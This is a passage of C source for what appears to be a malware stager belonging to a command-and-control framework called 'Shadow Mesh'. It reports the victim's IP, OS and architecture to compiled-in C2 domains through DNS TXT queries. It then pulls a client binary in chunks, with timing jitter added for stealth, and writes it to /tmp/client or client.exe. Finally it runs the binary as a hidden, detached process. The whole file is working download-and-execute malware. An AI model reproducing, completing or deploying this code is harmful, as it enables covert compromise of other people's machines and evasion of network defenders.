        DIAG_PRINT("[DIAG] ERROR: Encoded message too long (%zu chars, max 126)!\n", encoded_len);
        return -1;
    }
    
    // Retry mechanism with delays
    for (int attempt = 0; attempt < MAX_RETRIES; attempt++) {
    DEBUG_PRINT("[*] DNS query attempt %d/%d to %s\n", attempt + 1, MAX_RETRIES, target_domain);
        
        // Generate fresh timestamp for each attempt (cache busting + unique per retry)
        snprintf(domain, sizeof(domain), "%s.%lu.%s", 
                 split_domain, (unsigned long)time(NULL), target_domain);
        
        DIAG_PRINT("[DIAG] Constructed domain: %s (len=%zu)\n", domain, strlen(domain));
        DEBUG_PRINT("[*] Querying: %s\n", domain);
        
        char txt_response[4096];
        int query_result = dns_query_txt(domain, txt_response, sizeof(txt_response));
        
        DIAG_PRINT("[DIAG] Query result: %d (0=success, -1=failure)\n", query_result);
    DEBUG_PRINT("[*] Query result: %d\n", query_result);
        
        if (query_result == 0) {
            DIAG_PRINT("[DIAG] TXT response received: %.80s... (len=%zu)\n", 
                    txt_response, strlen(txt_response));
    DEBUG_PRINT("[*] TXT response: %s\n", txt_response);
            
            // Check if this is a CHUNK response (plain text, not base36 encoded)
            if (strncmp(txt_response, "CHUNK|", 6) == 0) {
                // CHUNK responses are sent as plain text (data is already base64)
                strncpy(response, txt_response, response_size - 1);
                response[response_size - 1] = '\0';
                DIAG_PRINT("[DIAG] CHUNK response detected (plain text, %zu bytes)\n", strlen(response));
    DEBUG_PRINT("[*] CHUNK response (plain text, %zu bytes)\n", strlen(response));
                return 0;
            }
            
            // Decode base36 response (for META and other messages)
            unsigned char decoded[4096];
            size_t decoded_len = base36_decode(txt_response, decoded, sizeof(decoded));
            
    DEBUG_PRINT("[*] Base36 decode: %zu bytes decoded from %zu bytes input\n", 
                decoded_len, strlen(txt_response));
    
            if (decoded_len > 0 && decoded_len < response_size) {
                memcpy(response, decoded, decoded_len);
                response[decoded_len] = '\0';
    DEBUG_PRINT("[*] Decoded response: %s\n", response);
                
                // Verify it's printable ASCII before accepting
                int is_valid = 1;
                for (size_t i = 0; i < decoded_len; i++) {
                    if (decoded[i] < 32 || decoded[i] > 126) {
                        if (decoded[i] != 0) { // Allow null terminator
    DEBUG_PRINT("[!] Non-printable byte at position %zu: 0x%02X\n", i, decoded[i]);
                            is_valid = 0;
                            break;
                        }
                    }
                }
                
                if (!is_valid) {
    DEBUG_PRINT("[!] WARNING: Decoded data contains non-printable characters\n");
                }
                
                // Return the decoded data regardless of printability check
                // The data should be valid if base36_decode succeeded
                return 0;
            } else if (decoded_len == 0) {
                // Maybe it's a plain text error response
                strncpy(response, txt_response, response_size - 1);
                response[response_size - 1] = '\0';
    DEBUG_PRINT("[*] Using raw response: %s\n", response);
                return 0;
            }
        }
        
        // Wait before retrying (except on last attempt)
        if (attempt < MAX_RETRIES - 1) {
            DEBUG_PRINT("[*] Waiting %d seconds before retry...\n", RETRY_DELAY_SECONDS);
#ifdef _WIN32
            Sleep(RETRY_DELAY_SECONDS * 1000);
#else
            sleep(RETRY_DELAY_SECONDS);
#endif
        } else {
            // Final attempt failed - provide detailed error
            DEBUG_PRINT("[!] ERROR: All %d DNS query attempts failed for domain: %s\n", 
                       MAX_RETRIES, target_domain);
            DEBUG_PRINT("[!] Possible causes:\n");
            DEBUG_PRINT("[!]   - DNS server unreachable (%s:%d)\n", DNS_SERVER, DNS_PORT);
            DEBUG_PRINT("[!]   - C2 domain not responding: %s\n", target_domain);
            DEBUG_PRINT("[!]   - Network filtering/firewall blocking DNS\n");
            DEBUG_PRINT("[!]   - Server-side issue (check server logs)\n");
        }
    }
    
    return -1;
}

/*
 * Execute the downloaded client
 */
static int execute_client(const char *client_path) {
#ifdef _WIN32
    // Make executable (Windows handles this automatically)
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "\"%s\"", client_path);
    
    if (CreateProcess(NULL, cmd, NULL, NULL, FALSE,
                     CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        DEBUG_PRINT("[*] Client launched successfully (detached process)\n");
        return 0;
    }
    DEBUG_PRINT("[!] Failed to launch client (error: %lu)\n", GetLastError());
    return -1;
#else
    // Make executable
    chmod(client_path, 0755);
    
    // Fork and execute
    pid_t pid = fork();
    if (pid == 0) {
        // Child process - detach from parent
        // Create new session to detach from terminal
        setsid();
        
        // Fork again to ensure we're not session leader
        pid_t pid2 = fork();
        if (pid2 != 0) {
            // First child exits
            exit(0);
        }
        
        // Second child (grandchild) continues
        // Change to root directory to avoid keeping any directory in use
        chdir("/");
        
        // Redirect stdout/stderr to /dev/null
        freopen(NULL_DEVICE, "w", stdout);
        freopen(NULL_DEVICE, "w", stderr);
        freopen(NULL_DEVICE, "r", stdin);
        
        // Execute the client
        execl(client_path, client_path, NULL);
        
        // If exec fails, exit
        exit(1);
    } else if (pid > 0) {
        // Parent process - wait for first child to exit
        // This ensures the grandchild is fully detached
        int status;
        waitpid(pid, &status, 0);
        DEBUG_PRINT("[*] Client launched successfully (detached process)\n");
        return 0;
    }
    
    DEBUG_PRINT("[!] Failed to fork client process\n");
    return -1;
#endif
}

/*
 * Main stager function
 */
int main(int argc, char *argv[]) {
    char local_ip[64];
    char arch[32];
    char message[256];
    char response[4096];
    char session_id[128] = "";
    int total_chunks = 0;
    unsigned char **chunks = NULL;
    size_t *chunk_sizes = NULL;
    
    // Parse compiled-in domains for load balancing
    char domains_copy[512];
    strncpy(domains_copy, C2_DOMAINS, sizeof(domains_copy) - 1);
    domains_copy[sizeof(domains_copy) - 1] = '\0';
    
    char *domain_list[MAX_DOMAINS];
    int domain_count = 0;
    
    char *token = strtok(domains_copy, ",");
    while (token != NULL && domain_count < MAX_DOMAINS) {
        // Trim whitespace
        while (*token == ' ') token++;
        domain_list[domain_count++] = token;
        token = strtok(NULL, ",");
    }
    
    if (domain_count == 0) {
        DEBUG_PRINT("[!] No domains configured\n");
        return 1;
    }
    
    // Initialize random seed for jitter AND domain selection
    srand((unsigned int)time(NULL));
    
    DEBUG_PRINT("[*] Starting stager...\n");
    DEBUG_PRINT("[*] ================================================\n");
    DEBUG_PRINT("[*] SHADOW MESH CONFIGURATION:\n");
    DEBUG_PRINT("[*] ------------------------------------------------\n");
    DEBUG_PRINT("[*]   DNS Domains:   %d servers\n", domain_count);
    for (int i = 0; i < domain_count; i++) {
        DEBUG_PRINT("[*]     └─ %s\n", domain_list[i]);
    }
    DEBUG_PRINT("[*] ------------------------------------------------\n");
    DEBUG_PRINT("[*] COMPILED JITTER CONFIGURATION:\n");
    DEBUG_PRINT("[*] ------------------------------------------------\n");
    DEBUG_PRINT("[*]   Jitter Range:  %d - %d ms (%.1f - %.1f seconds)\n", 
                MIN_CHUNK_DELAY_MS, MAX_CHUNK_DELAY_MS, 
                MIN_CHUNK_DELAY_MS/1000.0, MAX_CHUNK_DELAY_MS/1000.0);
    DEBUG_PRINT("[*]   Chunks/Burst:  %d chunks requested rapidly\n", CHUNKS_PER_BURST);
    DEBUG_PRINT("[*]   Burst Pause:   %d ms (%.1f seconds)\n", BURST_PAUSE_MS, BURST_PAUSE_MS/1000.0);
    DEBUG_PRINT("[*]   Total Delay:   %.1f - %.1f seconds between bursts\n",
                (MIN_CHUNK_DELAY_MS + BURST_PAUSE_MS)/1000.0,
                (MAX_CHUNK_DELAY_MS + BURST_PAUSE_MS)/1000.0);
    DEBUG_PRINT("[*] ================================================\n");
    
    // Get system information
    get_local_ip(local_ip, sizeof(local_ip));
    get_arch(arch, sizeof(arch));
    
    DEBUG_PRINT("[*] System info: IP=%s, OS=%s, ARCH=%s\n", local_ip, PLATFORM, arch);
    
    // Pick random domain for initial STG request
    char *initial_domain = domain_list[rand() % domain_count];
    DEBUG_PRINT("[*] Selected domain for STG: %s\n", initial_domain);
    
    // Send initial stager message: STG|IP|OS|ARCH
    snprintf(message, sizeof(message), "STG|%s|%s|%s", local_ip, PLATFORM, arch);
    DEBUG_PRINT("[*] Sending: %s\n", message);
    
    if (send_dns_message(message, initial_domain, response, sizeof(response)) != 0) {
    DEBUG_PRINT("[!] Failed to send DNS message\n");
        return 1;
    }
    
    DEBUG_PRINT("[*] ========================================\n");
    DEBUG_PRINT("[*] STG Response Received (length=%zu)\n", strlen(response));
    DEBUG_PRINT("[*] Response: %s\n", response);
    DEBUG_PRINT("[*] ========================================\n");
    
    // Check for ERROR responses from server
    if (strncmp(response, "ERROR", 5) == 0) {
    DEBUG_PRINT("[!] ========================================\n");
    DEBUG_PRINT("[!] Server returned ERROR response\n");
    DEBUG_PRINT("[!] Error: %s\n", response);
    DEBUG_PRINT("[!] ========================================\n");
        // Common errors:
        // ERROR|NO_CACHE - No cached client binary on this DNS server
        // ERROR|BINARY_NOT_FOUND - Standalone mode, binary missing
        if (strstr(response, "NO_CACHE") != NULL) {
    DEBUG_PRINT("[!] No cached binary on this DNS server\n");
    DEBUG_PRINT("[!] The Master may not have pushed the client binary yet\n");
        }
        return 1;
    }
    
    // Parse metadata response: META|<session_id>|<total_chunks>
    if (strncmp(response, "META|", 5) != 0) {
    DEBUG_PRINT("[!] ========================================\n");
    DEBUG_PRINT("[!] ERROR: Invalid META response format!\n");
    DEBUG_PRINT("[!] Expected: META|<session_id>|<number>\n");
    DEBUG_PRINT("[!] Received: %s\n", response);
    DEBUG_PRINT("[!] Length: %zu bytes\n", strlen(response));
    DEBUG_PRINT("[!] First 20 chars: %.20s\n", response);
    DEBUG_PRINT("[!] ========================================\n");
        return 1;
    }
    
    // Parse session ID and chunk count from response
    // Format: META|stg_1234567890_1234|3457
    char *pipe1 = strchr(response + 5, '|');
    if (!pipe1) {
    DEBUG_PRINT("[!] ERROR: Missing session ID in META response\n");
        return 1;
    }
    
    // Extract session ID
    size_t session_id_len = pipe1 - (response + 5);
    if (session_id_len >= sizeof(session_id)) {
    DEBUG_PRINT("[!] ERROR: Session ID too long\n");
        return 1;
    }
    strncpy(session_id, response + 5, session_id_len);
    session_id[session_id_len] = '\0';
    
    // Extract chunk count
    total_chunks = atoi(pipe1 + 1);
    DEBUG_PRINT("[*] Session ID: %s\n", session_id);
    DEBUG_PRINT("[*] Parsed chunk count: %d\n", total_chunks);
    
    if (total_chunks <= 0 || total_chunks > MAX_CHUNKS) {
    DEBUG_PRINT("[!] Invalid chunk count: %d\n", total_chunks);
        return 1;
    }
    
    DEBUG_PRINT("[*] Beacon divided into %d chunks for retrieval\n", total_chunks);
    
    // Wait 2 seconds to give DNS server time to report session to Master
    // This ensures Master has created the session before chunk requests start
    // Critical for progress tracking to work on first run
    DEBUG_PRINT("[*] Waiting 2 seconds for session synchronization...\n");
    sleep_ms(2000);
    DEBUG_PRINT("[*] Starting chunk retrieval\n");
    
    // Allocate chunk storage
    chunks = calloc(total_chunks, sizeof(unsigned char *));
    chunk_sizes = calloc(total_chunks, sizeof(size_t));
    if (!chunks || !chunk_sizes) {
    DEBUG_PRINT("[!] Failed to allocate chunk storage\n");
        free(chunks);
        free(chunk_sizes);
        return 1;
    }
    
    // Request each chunk with jitter for stealth and load balancing
    int burst_number = 0;
    for (int i = 0; i < total_chunks; i++) {
        // Mark the start of a new burst
        if (i % CHUNKS_PER_BURST == 0) {
            burst_number++;
            DEBUG_PRINT("\n[*] ========== BURST %d START (Chunks %d-%d) ==========\n", 
                       burst_number, i, 
                       (i + CHUNKS_PER_BURST - 1 < total_chunks) ? i + CHUNKS_PER_BURST - 1 : total_chunks - 1);
        }
        
        // Pick random domain for load balancing (client-side round-robin)
        char *target_domain = domain_list[rand() % domain_count];
        
        DEBUG_PRINT("[*] Requesting chunk %d/%d from %s\n", i+1, total_chunks, target_domain);
        
        // NEW PROTOCOL: CHUNK|<chunk_index>|<IP>|<session_id>
        // Changed from ACK to CHUNK for clarity
        snprintf(message, sizeof(message), "CHUNK|%d|%s|%s", 
                 i, local_ip, session_id[0] ? session_id : "UNKN0WN");
        
        if (send_dns_message(message, target_domain, response, sizeof(response)) != 0) {
            DIAG_PRINT("[DIAG] Failed to get chunk %d from %s\n", i, target_domain);
    DEBUG_PRINT("[!] Failed to get chunk %d from %s\n", i, target_domain);
            goto cleanup;
        }
        
        DIAG_PRINT("[DIAG] Received response for chunk %d: %.80s... (len=%zu)\n", 
                i, response, strlen(response));
        
        // Check for ERROR responses from server
        if (strncmp(response, "ERROR", 5) == 0) {
            DIAG_PRINT("[DIAG] Server returned ERROR for chunk %d: %s\n", i, response);
    DEBUG_PRINT("[!] ERROR receiving chunk %d: %s\n", i, response);
            goto cleanup;
        }
        
        // Parse chunk response: CHUNK|<data>
        if (strncmp(response, "CHUNK|", 6) != 0) {
            DIAG_PRINT("[DIAG] Invalid chunk response format (first 20 chars): %.20s\n", response);
    DEBUG_PRINT("[!] Invalid chunk response format: %s\n", response);
            goto cleanup;
        }
        
        DIAG_PRINT("[DIAG] Chunk %d parsed successfully, storing data\n", i);
        
        // Store the base64 encoded chunk
        size_t chunk_len = strlen(response + 6);
        chunks[i] = malloc(chunk_len + 1);
        if (!chunks[i]) {
            DIAG_PRINT("[DIAG] Failed to allocate memory for chunk %d\n", i);
            goto cleanup;
        }
        
        memcpy(chunks[i], response + 6, chunk_len + 1);
        chunk_sizes[i] = chunk_len;
        
        DIAG_PRINT("[DIAG] Chunk %d stored (%zu bytes), continuing to next chunk\n", i, chunk_len);
        
        // Apply timing delay ONLY after completing a burst
        // Within a burst, chunks are requested rapidly with no delay
        if (i < total_chunks - 1 && (i + 1) % CHUNKS_PER_BURST == 0) {
            DEBUG_PRINT("\n[*] ========== BURST %d COMPLETE ==========\n", burst_number);
            DEBUG_PRINT("[*] Completed burst of %d chunks (chunk %d/%d)\n", CHUNKS_PER_BURST, i + 1, total_chunks);
            
            // Calculate total delay: jitter + burst pause
            int jitter_delay = MIN_CHUNK_DELAY_MS + (rand() % (MAX_CHUNK_DELAY_MS - MIN_CHUNK_DELAY_MS + 1));
            int total_delay = jitter_delay + BURST_PAUSE_MS;
            
            DEBUG_PRINT("[*] Applying delay before next burst:\n");
            DEBUG_PRINT("    ├─ Jitter:      %dms (%.1fs)\n", jitter_delay, jitter_delay/1000.0);
            DEBUG_PRINT("    ├─ Burst pause: %dms (%.1fs)\n", BURST_PAUSE_MS, BURST_PAUSE_MS/1000.0);
            DEBUG_PRINT("    └─ Total delay: %dms (%.1fs)\n\n", total_delay, total_delay/1000.0);
            
#ifdef _WIN32
            Sleep(total_delay);  // Windows Sleep takes milliseconds
#else
            // Linux: use sleep() for seconds + usleep() for milliseconds remainder
            // usleep() has a limit of 999,999 microseconds (< 1 second)
            int seconds = total_delay / 1000;
            int milliseconds = total_delay % 1000;
            if (seconds > 0) {
                sleep(seconds);  // sleep() takes seconds
            }
            if (milliseconds > 0) {
                usleep(milliseconds * 1000);  // usleep() takes microseconds
            }
#endif
            DEBUG_PRINT("[*] Delay complete, requesting next burst\n");
        }
    }
    
    // Concatenate all base64 chunks
    size_t total_base64_size = 0;
    for (int i = 0; i < total_chunks; i++) {
        total_base64_size += chunk_sizes[i];
    }
    
    DEBUG_PRINT("[*] Total base64 data size: %zu bytes\n", total_base64_size);
    
    char *full_base64 = malloc(total_base64_size + 1);
    if (!full_base64) {
    DEBUG_PRINT("[!] Failed to allocate base64 buffer\n");
        goto cleanup;
    }
    
    size_t offset = 0;
    for (int i = 0; i < total_chunks; i++) {
        memcpy(full_base64 + offset, chunks[i], chunk_sizes[i]);
        offset += chunk_sizes[i];
    }
    full_base64[total_base64_size] = '\0';
    
    DEBUG_PRINT("[*] Decoding base64...\n");
    
    // Base64 decode
    unsigned char *compressed = malloc(total_base64_size); // Decoded will be smaller
    size_t compressed_size = base64_decode(full_base64, compressed, total_base64_size);
    free(full_base64);
    
    if (compressed_size == 0) {
    DEBUG_PRINT("[!] Base64 decode failed\n");
        free(compressed);
        goto cleanup;
    }
    
    DEBUG_PRINT("[*] Compressed size: %zu bytes\n", compressed_size);
    DEBUG_PRINT("[*] Decompressing...\n");
    
    // Decompress
    unsigned char *client_binary = NULL;
    size_t client_size = decompress_data(compressed, compressed_size, &client_binary);
    free(compressed);
    
    if (client_size == 0) {
        DEBUG_PRINT("[!] ERROR: Decompression failed - invalid or corrupted compressed data\n");
        goto cleanup;
    }
    
    DEBUG_PRINT("[*] Client binary size: %zu bytes\n", client_size);
    
    // Calculate MD5 checksum for integrity verification
    unsigned char md5_digest[MD5_DIGEST_SIZE];
    calculate_md5(client_binary, client_size, md5_digest);
    
    DEBUG_PRINT("[*] Client MD5: ");
    for (int i = 0; i < MD5_DIGEST_SIZE; i++) {
        DEBUG_PRINT("%02x", md5_digest[i]);
    }
    DEBUG_PRINT("\n");
    
    // Basic sanity checks on binary
    if (client_size < 100) {
        DEBUG_PRINT("[!] ERROR: Client binary too small (%zu bytes) - likely corrupted\n", client_size);
        free(client_binary);
        goto cleanup;
    }
    
    // Check for common executable magic bytes
    int is_valid_binary = 0;
#ifdef _WIN32
    // Windows PE: "MZ" header
    if (client_size >= 2 && client_binary[0] == 'M' && client_binary[1] == 'Z') {
        is_valid_binary = 1;
    }
#else
    // Linux ELF: 0x7F 'E' 'L' 'F'
    if (client_size >= 4 && client_binary[0] == 0x7F && 
        client_binary[1] == 'E' && client_binary[2] == 'L' && client_binary[3] == 'F') {
        is_valid_binary = 1;
    }
#endif
    
    if (!is_valid_binary) {
        DEBUG_PRINT("[!] ERROR: Binary verification failed - invalid executable format\n");
        DEBUG_PRINT("[!] First 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n",
                   client_binary[0], client_binary[1], client_binary[2], client_binary[3],
                   client_binary[4], client_binary[5], client_binary[6], client_binary[7]);
        free(client_binary);
        goto cleanup;
    }
    
    DEBUG_PRINT("[*] Binary format verified successfully\n");
    
    // Write client to disk (use /tmp on Linux for write permissions)
#ifdef _WIN32
    const char *client_filename = "client.exe";
#else
    const char *client_filename = "/tmp/client";
#endif
    
    DEBUG_PRINT("[*] Writing client to %s\n", client_filename);
    
    FILE *fp = fopen(client_filename, "wb");
    if (!fp) {
        DEBUG_PRINT("[!] ERROR: Failed to open file for writing: %s (errno: %d)\n", 
                   client_filename, errno);
        free(client_binary);
        goto cleanup;
    }
    
    fwrite(client_binary, 1, client_size, fp);
    fclose(fp);
    free(client_binary);
    
#ifndef _WIN32
    // Make the client executable on Linux
    if (chmod(client_filename, 0755) != 0) {
        DEBUG_PRINT("[!] WARNING: Failed to set executable permissions (errno: %d)\n", errno);
    }
#endif
    
    DEBUG_PRINT("[*] Executing client...\n");
    
    // Execute client
    if (execute_client(client_filename) != 0) {
        DEBUG_PRINT("[!] ERROR: Failed to execute client binary\n");
        goto cleanup;
    }
    
    DEBUG_PRINT("[+] Stager complete!\n");
    
    // Cleanup
cleanup:
    if (chunks) {
        for (int i = 0; i < total_chunks; i++) {
            free(chunks[i]);
        }
        free(chunks);
    }
    free(chunk_sizes);
    
    return 0;
}
